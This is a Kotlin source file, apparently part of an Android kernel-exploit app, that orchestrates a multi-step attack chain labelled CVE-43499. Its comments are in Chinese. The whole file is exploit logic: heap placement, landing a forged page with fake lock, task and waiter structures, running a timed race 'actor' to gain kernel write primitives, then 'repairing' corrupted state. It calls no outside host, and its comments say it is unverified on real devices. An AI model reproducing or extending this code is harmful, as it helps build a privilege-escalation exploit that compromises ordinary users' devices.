package com.ghostlock.app.backend.cve43499.flow

import com.ghostlock.app.backend.cve43499.generator.Cve43499GeneratorException
import com.ghostlock.app.backend.cve43499.generator.Cve43499WriteGenerator
import com.ghostlock.app.backend.cve43499.generator.Cve43499WriteRequest
import com.ghostlock.app.backend.cve43499.lifecycle.Cve43499ActorExecuteStep
import com.ghostlock.app.backend.cve43499.lifecycle.Cve43499ActorPrepareStep
import com.ghostlock.app.backend.cve43499.lifecycle.Cve43499ChainCloseReceipt
import com.ghostlock.app.backend.cve43499.lifecycle.Cve43499ExecuteFacts
import com.ghostlock.app.backend.cve43499.lifecycle.Cve43499LandingStep
import com.ghostlock.app.backend.cve43499.lifecycle.Cve43499LifecycleApi
import com.ghostlock.app.backend.cve43499.lifecycle.Cve43499PlacementFacts
import com.ghostlock.app.backend.cve43499.lifecycle.Cve43499PlacementStep
import com.ghostlock.app.backend.cve43499.lifecycle.Cve43499PrebuiltActivationStep
import com.ghostlock.app.backend.cve43499.owned.ActorPreparation
import com.ghostlock.app.backend.cve43499.owned.PlacementConfig
import com.ghostlock.app.jni.Native43499ActorSetup
import com.ghostlock.app.jni.Native43499PrimitiveSpec

/**
 * G05 预建 repair 链结局（pre-clear placement+landing；Actor 不预建）。
 *
 * @property Ready.facts 预建 placement 回传事实（最小事务证据）。
 * @property Failed.reason 具名原因。
 * @property Failed.retained dirty/retained（W1 dirty ⇒ fail-stop；不进 W1b/W2）。
 * @property Failed.termination discard/close 终结证据。
 */
internal sealed interface Cve43499PrebuildStep {
    data class Ready(val facts: Cve43499PlacementFacts) : Cve43499PrebuildStep
    data class Failed(
        val reason: String,
        val retained: Boolean,
        val termination: String,
    ) : Cve43499PrebuildStep
}

/**
 * G05 最小事务分项计时（I2 口径：elapsedRealtimeNanos；单位微秒）。
 *
 * @property activationUs activate 前→prepareActor 前（activation 子项）。
 * @property executeUs prepareActor 开始→executeActor 返回（panic 窗口主体）。
 * @property closeUs executeActor 返回→repair actor clean close 返回。
 * @property totalUs activate 前→clean close 返回（含 close 子项）。
 */
internal data class Cve43499RepairTiming(
    val activationUs: Long,
    val executeUs: Long,
    val closeUs: Long,
    val totalUs: Long,
)

/**
 * A1 debug-only page-prep-only 结局（只 placement+landing；不 prepareActor/executeActor）。
 *
 * @property Prepared.facts placement 事实（candidatePageBase 等）。
 * @property Prepared.primitive 由 generator 派生（含 fakeLock/fakeTask/fakeW0；供 probe JNI）。
 * @property Failed.reason 具名失败原因（测试记录后停）。
 * @note 仅供 debug androidTest `Mcast510ProbeTest`；生产 Flow 不调用。
 */
internal sealed interface Cve43499PageProbeStep {
    data class Prepared(
        val facts: Cve43499PlacementFacts,
        val primitive: Native43499PrimitiveSpec,
        /** Native landing 回执的实际页基址（task-123；0=未提供）。 */
        val actualPageBase: Long = 0L,
    ) : Cve43499PageProbeStep

    data class Failed(val reason: String) : Cve43499PageProbeStep
}

/**
 * G05 prebuilt repair 最小事务结局（activation 后只 prepareActor/executeActor/clean close）。
 *
 * @property Executed.facts 物理回执事实。
 * @property Executed.primitive 实际绑定 Carrier（证据用）。
 * @property Executed.closeReceipt repair actor close 回执（clean 才执行成功）。
 * @property Executed.activationNanos activation 成功时间（elapsedRealtimeNanos）。
 * @property Failed.retained dirty/retained（W2 成功后按 close-retained 合同 fail-stop）。
 */
internal sealed interface Cve43499PrebuiltRepairStep {
    /**
     * @property timing 最小事务分项计时（I2：activation/execute/close 子项）。
     */
    data class Executed(
        val facts: Cve43499ExecuteFacts,
        val primitive: Native43499PrimitiveSpec,
        val primitiveKind: String,
        val closeReceipt: Cve43499ChainCloseReceipt,
        val activationNanos: Long,
        val timing: Cve43499RepairTiming,
    ) : Cve43499PrebuiltRepairStep

    data class Failed(
        val reason: String,
        val retained: Boolean,
        val termination: String,
    ) : Cve43499PrebuiltRepairStep
}

/**
 * 单次写事务执行器（R3d 多写链的物理事务组合）。
 *
 * 一次写 = 一次完整的新事务：
 * ```
 * preparePlacement → generator(facts, request) → landPage → prepareActor → executeActor
 * ```
 * 成功时**链保持打开**（由调用方决定 `closeChain()` 还是保留给下一阶段，如 W1→W1b
 * 的 quarantine 语义）；失败时按 clean failure（可重试）与 dirty（保留）分流。
 *
 * 分层：本类属 Flow 编排层，只调用唯一生命周期层 [Cve43499LifecycleApi] 与纯函数
 * generator；不触 JNI、不生成/解释 payload 语义。
 *
 * @param lifecycle 本次运行的唯一生命周期层。
 * @param writeGenerator 按写请求生成 landing + primitive 的纯函数 seam。
 * @param placement 本次运行固定的 Placement 参数（每事务重新定位）。
 * @param actorSetup 普通阶段的 Actor 调度参数。
 * @param policy 写链轮次/等待策略（fast-repair 时序变体从中派生）。
 * @note 阶段：R3d；真机未验证。
 */
internal class Cve43499WriteTransactionRunner(
    private val lifecycle: Cve43499LifecycleApi,
    private val writeGenerator: Cve43499WriteGenerator,
    private val placement: PlacementConfig,
    private val actorSetup: Native43499ActorSetup,
    private val policy: Cve43499WriteChainPolicy,
    private val elapsedRealtimeNanos: () -> Long = {
        android.os.SystemClock.elapsedRealtimeNanos()
    },
) {
    /** G05：prebuilt repair 的最小事务 primitive（prebuild 成功时保存，activation 后使用）。 */
    private var prebuiltPrimitive: Native43499PrimitiveSpec? = null

    /**
     * A1 debug-only：只做 placement + generator + landing，返回 page/facts/primitive；
     * **不 prepareActor/不 executeActor/不写内核**。成功时链保持打开（调用方 finally closeChain）。
     *
     * @param request probe 写请求（target=0x1000/mode=ZERO/preserveChild=false）。
     * @return Prepared 或具名 Failed。
     * @note 仅 debug androidTest 使用；生产 `execute()` 不经过该分支。
     */
    fun preparePageOnly(request: Cve43499WriteRequest): Cve43499PageProbeStep =
        preparePageOnly { request }

    /**
     * A1 debug-only 变体：request 依赖本次 placement 的 page_base（`mcast510_target=page+...`）。
     *
     * @param requestFactory 以 `candidatePageBase` 生成 probe 写请求。
     * @return Prepared/Failed；语义同 [preparePageOnly]。
     */
    fun preparePageOnly(
        requestFactory: (pageBase: Long) -> Cve43499WriteRequest,
    ): Cve43499PageProbeStep {
        val placed = lifecycle.preparePlacement(placement)
        if (placed is Cve43499PlacementStep.Failed) {
            return Cve43499PageProbeStep.Failed("mcast510:placement:" + placed.reason)
        }
        val facts = (placed as Cve43499PlacementStep.Prepared).facts
        val request = requestFactory(facts.candidatePageBase)
        val generated = try {
            writeGenerator.generateForWrite(facts, request)
        } catch (problem: Cve43499GeneratorException) {
            closeChainQuiet()
            return Cve43499PageProbeStep.Failed("mcast510:generator:" + problem.reason)
        } catch (problem: Exception) {
            closeChainQuiet()
            return Cve43499PageProbeStep.Failed(
                "mcast510:generator-exception:" + problem.javaClass.simpleName,
            )
        }
        return when (val landed = lifecycle.landPage(generated.landing)) {
            is Cve43499LandingStep.Landed -> Cve43499PageProbeStep.Prepared(
                facts = facts,
                primitive = generated.primitive,
                actualPageBase = landed.actualPageBase,
            )
            is Cve43499LandingStep.CleanFailure -> {
                closeChainQuiet()
                Cve43499PageProbeStep.Failed("mcast510:landing:" + landed.reason)
            }
            is Cve43499LandingStep.ConsumedDirty -> Cve43499PageProbeStep.Failed(
                "mcast510:landing-dirty:" + landed.reason,
            )
            is Cve43499LandingStep.Failed -> {
                closeChainQuiet()
                Cve43499PageProbeStep.Failed("mcast510:landing:" + landed.reason)
            }
        }
    }

    /**
     * 执行一次写事务。
     *
     * @param stage 阶段 id（失败定位/证据前缀）。
     * @param request 本事务写请求（target/mode/preserveChild）。
     * @return 具名结局；[Cve43499WriteTransactionStep.Executed] 时链保持打开。
     */
    fun execute(
        stage: Cve43499WriteStageId,
        request: Cve43499WriteRequest,
    ): Cve43499WriteTransactionStep {
        val prefix = "cve43499:write." + stage.token + ":"
        val placed = lifecycle.preparePlacement(placement)
        if (placed is Cve43499PlacementStep.Failed) {
            return Cve43499WriteTransactionStep.Failed(
                prefix + placed.reason,
                retained = false,
            )
        }
        val facts = (placed as Cve43499PlacementStep.Prepared).facts
        val generated = try {
            writeGenerator.generateForWrite(facts, request)
        } catch (problem: Cve43499GeneratorException) {
            closeChainQuiet()
            return Cve43499WriteTransactionStep.Failed(
                prefix + "generator:" + problem.reason,
                retained = false,
            )
        } catch (problem: Exception) {
            closeChainQuiet()
            return Cve43499WriteTransactionStep.Failed(
                prefix + "generator-exception:" + problem.javaClass.simpleName,
                retained = false,
            )
        }
        var reclaimSends = 0L
        when (val landed = lifecycle.landPage(generated.landing)) {
            is Cve43499LandingStep.Landed -> reclaimSends = landed.reclaimSends
            is Cve43499LandingStep.CleanFailure -> {
                closeChainQuiet()
                return Cve43499WriteTransactionStep.RouteMiss(
                    prefix + landed.reason,
                    primitiveKind = null,
                )
            }
            is Cve43499LandingStep.ConsumedDirty -> return Cve43499WriteTransactionStep.Failed(
                prefix + landed.reason,
                retained = true,
            )
            is Cve43499LandingStep.Failed -> {
                closeChainQuiet()
                return Cve43499WriteTransactionStep.Failed(
                    prefix + landed.reason,
                    retained = false,
                )
            }
        }
        val setup = if (stage == Cve43499WriteStageId.W2_REPAIR) {
            fastRepairActorSetup()
        } else {
            actorSetup
        }
        val prepared = lifecycle.prepareActor(
            ActorPreparation(setup = setup, primitive = generated.primitive),
        )
        var primitiveKind: String? = null
        when (prepared) {
            is Cve43499ActorPrepareStep.Prepared -> primitiveKind = prepared.primitiveKind
            is Cve43499ActorPrepareStep.CleanFailure -> {
                closeChainQuiet()
                return Cve43499WriteTransactionStep.RouteMiss(
                    prefix + prepared.reason,
                    primitiveKind = null,
                )
            }
            is Cve43499ActorPrepareStep.ConsumedDirty -> return Cve43499WriteTransactionStep.Failed(
                prefix + prepared.reason,
                retained = true,
            )
            is Cve43499ActorPrepareStep.Failed -> {
                closeChainQuiet()
                return Cve43499WriteTransactionStep.Failed(
                    prefix + prepared.reason,
                    retained = false,
                )
            }
        }
        return when (val executed = lifecycle.executeActor()) {
            is Cve43499ActorExecuteStep.Executed -> {
                if (executed.facts.retainedForProcessExit) {
                    /* G01：Actor 报 retained ⇒ dirty（不可重试；Flow 触发 fail-stop）。 */
                    Cve43499WriteTransactionStep.Failed(
                        prefix + "actor-retained-for-process-exit",
                        retained = true,
                    )
                } else Cve43499WriteTransactionStep.Executed(
                facts = facts,
                reclaimSends = reclaimSends,
                primitiveKind = primitiveKind ?: "unknown",
                consumerSuccess = executed.facts.consumerSuccess,
                carrierArmed = executed.facts.carrierArmed,
                carrierOperations = executed.facts.carrierOperations,
                carrierLastStep = executed.facts.carrierLastStep,
                carrierLastErrno = executed.facts.carrierLastErrno,
                primitive = generated.primitive,
                )
            }
            is Cve43499ActorExecuteStep.CleanFailure -> {
                closeChainQuiet()
                Cve43499WriteTransactionStep.RouteMiss(
                    prefix + executed.reason,
                    primitiveKind = primitiveKind,
                )
            }
            is Cve43499ActorExecuteStep.ConsumedDirty -> Cve43499WriteTransactionStep.Failed(
                prefix + executed.reason,
                retained = true,
            )
            is Cve43499ActorExecuteStep.Failed -> {
                closeChainQuiet()
                Cve43499WriteTransactionStep.Failed(
                    prefix + executed.reason,
                    retained = false,
                )
            }
        }
    }

    /**
     * G05 预建 repair 链：placement → generator → landing（不 prepareActor）。
     *
     * @param stage 失败定位 stage（证据前缀）。
     * @param request repair 写请求（target/mode 派生自 planner）。
     * @return Ready（已保存 primitive，供 [executePrebuiltRepair]）/ Failed（clean 或 retained）。
     * @note clean failure 由调用方决定是否允许 full fallback；retained 不得继续 W1b/W2。
     */
    fun prebuildRepair(
        stage: Cve43499WriteStageId,
        request: Cve43499WriteRequest,
    ): Cve43499PrebuildStep {
        val prefix = "cve43499:write." + stage.token + ":prebuild:"
        when (val placed = lifecycle.prebuildRepairPlacement(placement)) {
            is Cve43499PlacementStep.Failed -> {
                val discard = lifecycle.discardPrebuiltRepair()
                return Cve43499PrebuildStep.Failed(
                    prefix + placed.reason,
                    retained = discard.retained,
                    termination = discard.termination,
                )
            }
            is Cve43499PlacementStep.Prepared -> {
                val facts = placed.facts
                val generated = try {
                    writeGenerator.generateForWrite(facts, request)
                } catch (problem: Cve43499GeneratorException) {
                    val discard = lifecycle.discardPrebuiltRepair()
                    return Cve43499PrebuildStep.Failed(
                        prefix + "generator:" + problem.reason,
                        retained = discard.retained,
                        termination = discard.termination,
                    )
                } catch (problem: Exception) {
                    val discard = lifecycle.discardPrebuiltRepair()
                    return Cve43499PrebuildStep.Failed(
                        prefix + "generator-exception:" + problem.javaClass.simpleName,
                        retained = discard.retained,
                        termination = discard.termination,
                    )
                }
                return when (val landed = lifecycle.landPrebuildRepair(generated.landing)) {
                    is Cve43499LandingStep.Landed -> {
                        prebuiltPrimitive = generated.primitive
                        Cve43499PrebuildStep.Ready(facts)
                    }
                    is Cve43499LandingStep.CleanFailure -> {
                        val discard = lifecycle.discardPrebuiltRepair()
                        Cve43499PrebuildStep.Failed(
                            prefix + landed.reason,
                            retained = discard.retained,
                            termination = discard.termination,
                        )
                    }
                    is Cve43499LandingStep.ConsumedDirty -> {
                        val discard = lifecycle.discardPrebuiltRepair()
                        Cve43499PrebuildStep.Failed(
                            prefix + landed.reason,
                            retained = true,
                            termination = discard.termination,
                        )
                    }
                    is Cve43499LandingStep.Failed -> {
                        val discard = lifecycle.discardPrebuiltRepair()
                        Cve43499PrebuildStep.Failed(
                            prefix + landed.reason,
                            retained = discard.retained,
                            termination = discard.termination,
                        )
                    }
                }
            }
        }
    }

    /**
     * G05 最小事务：activation → prepareActor → executeActor → clean close（不再 placement/landing）。
     *
     * @param stage 失败定位 stage（证据前缀）。
     * @return Executed（含 repair actor close 回执，调用方须判定 clean）/ Failed。
     * @note 任何 clean-failure 后的 close 都返回回执并判定 retained（不静默丢弃）。
     */
    fun executePrebuiltRepair(stage: Cve43499WriteStageId): Cve43499PrebuiltRepairStep {
        val prefix = "cve43499:write." + stage.token + ":prebuilt:"
        val primitive = prebuiltPrimitive
            ?: return Cve43499PrebuiltRepairStep.Failed(
                prefix + "not-ready",
                retained = false,
                termination = "prebuilt=not-ready;",
            )
        val activateStart = elapsedRealtimeNanos()
        val activated = lifecycle.activatePrebuiltRepair()
        val afterActivate = elapsedRealtimeNanos()
        if (activated is Cve43499PrebuiltActivationStep.Failed) {
            return Cve43499PrebuiltRepairStep.Failed(
                prefix + "activate:" + activated.reason,
                retained = activated.retained,
                termination = "prebuilt=activation-failed;",
            )
        }
        val activationNanos = (activated as Cve43499PrebuiltActivationStep.Activated).prebuiltNanos
        val prepareStart = elapsedRealtimeNanos()
        return when (val prepared = lifecycle.prepareActor(
            ActorPreparation(setup = fastRepairActorSetup(), primitive = primitive),
        )) {
            is Cve43499ActorPrepareStep.Prepared -> {
                val primitiveKind = prepared.primitiveKind
                val executed = lifecycle.executeActor()
                val afterExecute = elapsedRealtimeNanos()
                finishPrebuiltTransaction(
                    stagePrefix = prefix,
                    primitive = primitive,
                    primitiveKind = primitiveKind,
                    executed = executed,
                    activationNanos = activationNanos,
                    activateStart = activateStart,
                    afterActivate = afterActivate,
                    prepareStart = prepareStart,
                    afterExecute = afterExecute,
                )
            }
            is Cve43499ActorPrepareStep.ConsumedDirty -> {
                val receipt = closeChainReceipt()
                Cve43499PrebuiltRepairStep.Failed(
                    prefix + "prepare-actor:dirty",
                    retained = true,
                    termination = receipt.termination,
                )
            }
            is Cve43499ActorPrepareStep.CleanFailure -> {
                /* B1④：clean-failure 后的 close 回执必须判定 retained，不得静默。 */
                val receipt = closeChainReceipt()
                Cve43499PrebuiltRepairStep.Failed(
                    prefix + "prepare-actor:" + prepared.reason,
                    retained = receipt.retained || !receipt.allReleased,
                    termination = receipt.termination,
                )
            }
            is Cve43499ActorPrepareStep.Failed -> {
                val receipt = closeChainReceipt()
                Cve43499PrebuiltRepairStep.Failed(
                    prefix + "prepare-actor:" + prepared.reason,
                    retained = receipt.retained || !receipt.allReleased,
                    termination = receipt.termination,
                )
            }
        }
    }

    /**
     * 结束最小事务：executeActor 结局 + close 回执统一映射（B1⑤）。
     */
    private fun finishPrebuiltTransaction(
        stagePrefix: String,
        primitive: Native43499PrimitiveSpec,
        primitiveKind: String,
        executed: Cve43499ActorExecuteStep,
        activationNanos: Long,
        activateStart: Long,
        afterActivate: Long,
        prepareStart: Long,
        afterExecute: Long,
    ): Cve43499PrebuiltRepairStep = when (executed) {
        is Cve43499ActorExecuteStep.Executed -> {
            if (executed.facts.retainedForProcessExit) {
                val receipt = closeChainReceipt()
                Cve43499PrebuiltRepairStep.Failed(
                    stagePrefix + "actor-execute-retained",
                    retained = true,
                    termination = receipt.termination,
                )
            } else {
                val receipt = closeChainReceipt()
                if (receipt.retained || !receipt.allReleased) {
                    Cve43499PrebuiltRepairStep.Failed(
                        stagePrefix + "repair-actor-close-retained",
                        retained = true,
                        termination = receipt.termination,
                    )
                } else {
                    val afterClose = elapsedRealtimeNanos()
                    prebuiltPrimitive = null
                    Cve43499PrebuiltRepairStep.Executed(
                        facts = executed.facts,
                        primitive = primitive,
                        primitiveKind = primitiveKind,
                        closeReceipt = receipt,
                        activationNanos = activationNanos,
                        timing = Cve43499RepairTiming(
                            activationUs = (afterActivate - activateStart) / 1_000L,
                            executeUs = (afterExecute - prepareStart) / 1_000L,
                            closeUs = (afterClose - afterExecute) / 1_000L,
                            totalUs = (afterClose - activateStart) / 1_000L,
                        ),
                    )
                }
            }
        }
        is Cve43499ActorExecuteStep.ConsumedDirty -> {
            val receipt = closeChainReceipt()
            Cve43499PrebuiltRepairStep.Failed(
                stagePrefix + "actor-execute:dirty",
                retained = true,
                termination = receipt.termination,
            )
        }
        is Cve43499ActorExecuteStep.CleanFailure -> {
            val receipt = closeChainReceipt()
            Cve43499PrebuiltRepairStep.Failed(
                stagePrefix + "actor-execute:" + executed.reason,
                retained = receipt.retained || !receipt.allReleased,
                termination = receipt.termination,
            )
        }
        is Cve43499ActorExecuteStep.Failed -> {
            val receipt = closeChainReceipt()
            Cve43499PrebuiltRepairStep.Failed(
                stagePrefix + "actor-execute:" + executed.reason,
                retained = receipt.retained || !receipt.allReleased,
                termination = receipt.termination,
            )
        }
    }

    /** @return 当前 active chain 的 close 回执（无链返回 skipped clean 回执）。 */
    private fun closeChainReceipt(): Cve43499ChainCloseReceipt =
        runCatching { lifecycle.closeChain() }.getOrElse { problem ->
            Cve43499ChainCloseReceipt(
                termination = "close-threw:" + problem.javaClass.simpleName + ";",
                allReleased = false,
                retained = true,
            )
        }

    /**
     * @return fast-repair 事务的 Actor 调度参数（setup settle/等待窗口/自旋上限变体）。
     * @note legacy2 `race.cpp:341-377`：fast_repair 期间 consumer delay/settle=5000µs、
     *   waiter 窗口=20ms；本实现映射到 actor_setup 的既有 append-only 参数。
     */
    private fun fastRepairActorSetup(): Native43499ActorSetup = actorSetup.copy(
        setupSettleUs = policy.fastRepairSetupSettleUs,
        parkedTimeoutNanos = policy.fastRepairParkedTimeoutNanos,
        lockPiSpinNs = policy.fastRepairLockPiSpinNs,
    )

    /**
     * 失败路径关闭当前链；保留闭包由 Native 报 retained，不在此猜测回收。
     *
     * @note 关闭本身失败不覆盖主失败原因（由 closeAll 的聚合回执兜底）。
     */
    private fun closeChainQuiet() {
        runCatching { lifecycle.closeChain() }
    }
}
